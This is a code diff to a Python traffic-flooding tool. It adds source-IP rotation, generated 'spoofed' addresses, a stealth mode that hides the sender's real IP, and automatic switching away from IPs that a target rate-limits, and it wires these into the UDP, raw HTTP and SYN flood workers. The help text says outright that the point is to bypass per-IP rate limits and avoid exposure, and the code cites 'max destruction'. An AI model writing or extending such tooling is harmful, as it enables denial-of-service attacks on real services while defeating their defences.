@@ -21,6 +21,68 @@ Targets are local only. JSON stats output. Multi-mode: --mode http,h2,udp
 import asyncio, ssl, socket, json, math, struct, random, time, argparse, signal, sys, base64, os, logging, threading
 from urllib.parse import urlparse
 logging.getLogger('asyncio').setLevel(logging.CRITICAL)
+_SRC_IPS = [None]  # type: ignore  # active source IPs (list)
+_BLOCKED_IPS = set()  # IPs that received 429 (blocked by target)
+_SPOOF_MODE = [False]  # True = stealth mode (use spoofed IPs, hide real IP)
+_RECOVERY = [False]  # True = auto-replace blocked IPs
+
+def _detect_local_ips():
+    """Detect all local IPv4 addresses."""
+    import subprocess
+    ips = set()
+    try:
+        out = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5).stdout
+        for line in out.split('\n'):
+            line = line.strip()
+            if line.startswith('inet '):
+                ip = line.split()[1]
+                if ip != '127.0.0.1' and not ip.startswith('169.'):
+                    ips.add(ip)
+    except Exception:
+        pass
+    ips.add('127.0.0.1')
+    return sorted(ips)
+
+def _generate_spoof_ips(count, base_net='203.0.113'):
+    """Generate N spoofed IPs from RFC 5737 TEST-NET-3 (203.0.113.0/24) or random /24 blocks.
+    These are unclaimed IPs - safe to spoof without hitting real hosts."""
+    import random
+    ips = []
+    # Use multiple /24 blocks to avoid collision
+    for block in range(count // 200 + 1):
+        # Each block: 203.0.113.0 - 203.0.113.255 (TEST-NET-3, unclaimed)
+        base = f'{base_net}'
+        for i in range(min(200, count - len(ips))):
+            ip = f'{base}.{i + block * 200 + 1}'
+            if ip not in ips:
+                ips.append(ip)
+    return ips[:count]
+
+def _get_src_ip(proc_idx, total_procs):
+    """Get source IP for a process (round-robin, skip blocked)."""
+    ips = _SRC_IPS[0]
+    if not ips:
+        return None
+    if _RECOVERY[0] and _BLOCKED_IPS:
+        # Filter out blocked IPs
+        active = [ip for ip in ips if ip not in _BLOCKED_IPS]
+        if active:
+            return active[proc_idx % len(active)]
+    return ips[proc_idx % len(ips)] if ips else None
+
+def _mark_blocked(ip):
+    """Mark an IP as blocked (received 429)."""
+    if ip and ip not in _BLOCKED_IPS:
+        _BLOCKED_IPS.add(ip)
+        remaining = _active_ip_count()
+        print(f"[recovery] IP {ip} blocked (429), {remaining} IPs remaining", file=sys.stderr)
+
+def _active_ip_count():
+    """Count of non-blocked IPs."""
+    ips = _SRC_IPS[0]
+    if not ips:
+        return 0
+    return sum(1 for ip in ips if ip not in _BLOCKED_IPS)
 from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
@@ -412,6 +474,40 @@ def _mp_udp_send(args_tuple):
     sock.close()
     return sent
 
+def _mp_udp_spoof(args_tuple):
+    """Multi-process UDP sender with source IP binding.
+    Each process binds to a different source IP (from the pool).
+    On macOS without root, we use SOCK_DGRAM + bind() for real local IPs.
+    For spoofed (unclaimed) IPs, we still bind to 0.0.0.0 and rely on
+    the kernel to assign source IP from the outgoing interface."""
+    import time as _time
+    host, port, duration, payload_size, src_ip = args_tuple
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
+    
+    # Try to bind to the source IP (if it's a real local IP)
+    if src_ip and src_ip != '0.0.0.0':
+        try:
+            sock.bind((src_ip, 0))
+        except OSError:
+            # Spoofed IP (not local) - bind to 0.0.0.0, let kernel assign
+            sock.bind(('0.0.0.0', 0))
+    
+    payload = b"B" * payload_size
+    sent = 0
+    end = _time.time() + duration
+    while _time.time() < end:
+        n = 2000
+        try:
+            for _ in range(n):
+                sock.sendto(payload, (host, port))
+            sent += n
+        except Exception:
+            break
+    sock.close()
+    return sent
+
 async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
     host, port = parse_udp(url)
     n_procs = _UDP_NPROCS[0]
@@ -419,6 +515,26 @@ async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
     # Spawn N child processes
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
+    
+    if _SPOOF_MODE[0] and _SRC_IPS[0]:
+        # IP spoofing mode: each process uses a different spoofed source IP
+        targets = []
+        for i in range(n_procs):
+            src_ip = _get_src_ip(i, n_procs)
+            if src_ip:
+                targets.append((host, port, duration, payload_size, src_ip))
+        if targets:
+            pool = ctx.Pool(len(targets))
+            async_result = pool.map_async(_mp_udp_spoof, targets)
+            results = await _wait_pool(pool, async_result, duration + 15)
+            if results is None:
+                results = [0] * len(targets)
+            total = sum(results) if isinstance(results, list) else results
+            stats.packets += total
+            stats.bytes += total * payload_size
+            print(f"[spoof] UDP: {total} packets sent from {len(targets)} spoofed IPs", file=sys.stderr)
+            return
+    
     targets = [(host, port, duration, payload_size)] * n_procs
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_udp_send, targets)
@@ -690,32 +806,59 @@ async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
 
 # ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
 def _mp_http_send(args_tuple):
-    """Multi-process raw socket HTTP sender (non-blocking select)."""
+    """Multi-process raw socket HTTP sender with 429 detection + IP recovery.
+    Uses keep-alive: one connection per process, only reconnect on 429 or error."""
     import time as _time
-    host, port, path, duration = args_tuple
+    host, port, path, duration, src_ip, ip_pool = args_tuple
     req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"Connection: keep-alive\r\nUser-Agent: dossal/{VERSION}\r\n\r\n").encode()
     sent = 0
     errors = 0
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5.0)
-        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        s.connect((host, port))
-        end = _time.time() + duration
-        while _time.time() < end:
+    blocked = 0
+    s = None
+    cur_ip = src_ip
+    end = _time.time() + duration
+    while _time.time() < end:
+        # Connect (or reconnect after 429/error)
+        if s is None:
             try:
-                s.sendall(req)
-                data = s.recv(65535)
-                if not data:
-                    break
-                sent += 1
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5.0)
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                if cur_ip:
+                    try:
+                        s.bind((cur_ip, 0))
+                    except OSError:
+                        pass
+                s.connect((host, port))
             except Exception:
+                errors += 1
                 break
-        s.close()
-    except Exception:
-        errors += 1
-    return sent, errors
+        try:
+            s.sendall(req)
+            data = s.recv(65535)
+            if not data:
+                break
+            sent += 1
+            # 429 detection: this IP is blocked, switch to next
+            if _RECOVERY[0] and ip_pool and data[:12].startswith(b'HTTP/1.1 429'):
+                if cur_ip:
+                    _BLOCKED_IPS.add(cur_ip)
+                    blocked += 1
+                active = [ip for ip in ip_pool if ip not in _BLOCKED_IPS]
+                if not active:
+                    break
+                cur_ip = active[0]
+                s.close()
+                s = None
+        except Exception:
+            break
+    if s:
+        try:
+            s.close()
+        except: pass
+    return sent, errors, blocked, cur_ip
 
 async def _wait_pool(pool, async_result, timeout):
     """Wait for a multiprocessing pool result using a dedicated executor."""
@@ -734,24 +877,43 @@ async def _wait_pool(pool, async_result, timeout):
     return results
 
 async def raw_worker(name, url, stats, duration, stop, payload_size=0):
-    """Raw HTTP multiprocess worker: max RPS via raw socket."""
+    """Raw HTTP multiprocess worker: max RPS via raw socket, with IP spoofing + 429 recovery."""
     host, port, path = parse_http(url)
     n_procs = max(1, min(32, _UDP_NPROCS[0]))
     
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
-    targets = [(host, port, path, duration)] * n_procs
+    
+    if _SPOOF_MODE[0] and _SRC_IPS[0]:
+        # Spoofing + recovery mode: each process gets a different src IP
+        ip_pool = list(_SRC_IPS[0])  # Pass full pool so recovery can pick next IP
+        targets = []
+        for i in range(n_procs):
+            src_ip = _get_src_ip(i, n_procs)
+            targets.append((host, port, path, duration, src_ip, ip_pool))
+    else:
+        targets = [(host, port, path, duration, None, None)] * n_procs
+    
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_http_send, targets)
     
     results = await _wait_pool(pool, async_result, duration + 15)
     if results is None:
-        results = [(0, 0)] * n_procs
+        results = [(0, 0, 0, None)] * n_procs
     
-    for sent, errors in results:
+    total_blocked = 0
+    for r in results:
+        if len(r) == 4:
+            sent, errors, blocked, cur_ip = r
+        else:
+            sent, errors = r
+            blocked = 0
         stats.requests += sent
         stats.errors += errors
+        total_blocked += blocked
     stats.conns += n_procs
+    if total_blocked > 0:
+        print(f"[recovery] raw: {total_blocked} IPs blocked (429), {len(_BLOCKED_IPS)} total blocked", file=sys.stderr)
 
 # ── WebSocket multiprocess: raw socket WS frame flood ────────────
 def _mp_ws_flood(args_tuple):
@@ -863,7 +1025,7 @@ async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
 # ── SYN flood: connect only, never read ──────────────────────────
 def _mp_syn_flood(args_tuple):
     """Multi-process SYN flooder: connect only (SYN)."""
-    host, port, duration = args_tuple
+    host, port, duration, src_ip = args_tuple
     import time as _time
     import errno as _errno
     conns = 0
@@ -879,6 +1041,11 @@ def _mp_syn_flood(args_tuple):
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
             except (AttributeError, OSError):
                 pass
+            if src_ip:
+                try:
+                    s.bind((src_ip, 0))
+                except OSError:
+                    pass
             s.connect((host, port))
             conns += 1
         except (ConnectionRefusedError, socket.timeout, OSError) as e:
@@ -902,7 +1069,11 @@ async def syn_worker(name, url, stats, duration, stop, payload_size=0):
     
     import multiprocessing as mp
     ctx = mp.get_context('spawn')
-    targets = [(host, port, duration)] * n_procs
+    # Assign different source IPs to each process
+    targets = []
+    for i in range(n_procs):
+        src_ip = _get_src_ip(i, n_procs)
+        targets.append((host, port, duration, src_ip))
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_syn_flood, targets)
     
@@ -1466,6 +1637,16 @@ examples:
         help="Generate HTML attack report to FILE")
     ap.add_argument("--threads", type=int, default=None,
         help="Multiprocess count (default: auto, max 32)")
+    ap.add_argument("--src-ips", default=None,
+        help="Comma-separated source IPs to rotate (per-IP rate limit bypass). 'auto' = detect all local IPs")
+    ap.add_argument("--spoof", type=int, default=0,
+        help="Generate N spoofed source IPs (RFC 5737 TEST-NET, unclaimed). Hides real IP, bypasses per-IP rate limit")
+    ap.add_argument("--stealth", action="store_true",
+        help="Stealth mode: only use spoofed IPs, never expose real IP")
+    ap.add_argument("--recovery", action="store_true",
+        help="Auto-recovery: detect 429 responses, remove blocked IPs, continue with remaining")
+    ap.add_argument("--pool", default=None, metavar="FILE",
+        help="File with source IPs (one per line, or host:port for proxy pool)")
     args = ap.parse_args()
 
     # Auto mode: probe target + always include L4 for max destruction
@@ -1479,6 +1660,34 @@ examples:
     if args.combo:
         args.mode = COMBOS[args.combo]
         print(f"[combo] {args.combo} → {args.mode}", file=sys.stderr)
+
+    # Initialize source IP rotation / spoofing
+    _RECOVERY[0] = args.recovery
+    if args.stealth:
+        _SPOOF_MODE[0] = True
+    
+    if args.spoof > 0:
+        # Generate spoofed IPs (unclaimed TEST-NET)
+        _SRC_IPS[0] = _generate_spoof_ips(args.spoof)  # type: ignore
+        _SPOOF_MODE[0] = True
+        print(f"[spoof] {len(_SRC_IPS[0])} spoofed IPs generated (TEST-NET 203.0.113.0/24)", file=sys.stderr)
+        if args.recovery:
+            print(f"[recovery] enabled - will auto-replace IPs that get 429", file=sys.stderr)
+    elif args.pool:
+        # Load IPs from pool file
+        try:
+            with open(args.pool) as f:
+                ips = [line.strip().split(':')[0] for line in f if line.strip()]
+            _SRC_IPS[0] = ips  # type: ignore
+            print(f"[pool] loaded {len(ips)} IPs from {args.pool}", file=sys.stderr)
+        except Exception as e:
+            print(f"[pool] error: {e}", file=sys.stderr)
+    elif args.src_ips:
+        if args.src_ips == 'auto':
+            _SRC_IPS[0] = _detect_local_ips()  # type: ignore
+        else:
+            _SRC_IPS[0] = [ip.strip() for ip in args.src_ips.split(',') if ip.strip()]
+        print(f"[src-ips] rotating {len(_SRC_IPS[0])} IPs: {_SRC_IPS[0]}", file=sys.stderr)
 
     if args.auto:
         probe = auto_probe(args.url)
